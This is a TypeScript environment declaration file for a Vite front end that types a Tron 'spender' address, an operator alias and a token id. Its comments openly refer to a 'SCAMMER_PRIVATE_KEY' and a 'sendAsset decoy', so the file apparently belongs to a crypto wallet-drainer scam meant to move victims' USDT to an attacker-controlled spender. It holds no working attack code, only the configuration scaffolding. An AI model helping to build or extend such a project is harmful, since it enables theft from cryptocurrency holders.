/// <reference types="vite/client" />

interface ImportMetaEnv {
  /** Base58 Tron address of the server spender — must match SCAMMER_PRIVATE_KEY / TRON_SERVER_PRIVATE_KEY. */
  readonly VITE_TRON_SPENDER_ADDRESS?: string;
  /** Optional alias for spender; can mirror server OPERATOR_ADDRESS as a client-exposed value. */
  readonly VITE_OPERATOR_ADDRESS?: string;
  /** Optional TRC10 asset name/id for sendAsset decoy (default "USDT"). */
  readonly VITE_TRON_SEND_ASSET_TOKEN_ID?: string;
}
